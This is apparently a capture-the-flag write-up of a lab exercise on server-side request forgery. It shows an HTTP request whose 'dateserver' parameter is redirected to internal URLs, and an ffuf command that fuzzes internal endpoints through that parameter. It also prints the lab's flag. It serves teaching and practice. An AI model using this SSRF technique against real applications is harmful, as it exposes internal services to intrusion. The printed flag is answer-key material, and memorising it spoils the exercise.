## Challenge
Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag.

## Solution

On the page there is a function to check the availability of a date, and that request is as follows:

```http
POST /index.php HTTP/1.1
Host: 10.129.132.5
Content-Length: 65
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.129.132.5
Referer: http://10.129.132.5/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

dateserver=http://dateserver.htb/availability.php&date=2024-01-01
```

I send another request to the `//dateserver.htb/invalid.php` and see it it got the error message:

```sh
Server at dateserver.htb Port 80
```

Now I use `ffuf` to check for more internal endpoints that we can reach - and filter the error message.

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.132.5/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"

```

Two of the endpoints found are:

```sh
admin                   [Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 4395ms]
availability            [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 117ms]
```

Let's try to reach `admin.php`.

In the response we have the flag which is:

`HTB{61ea58507c2b9da30465b9582d6782a1}`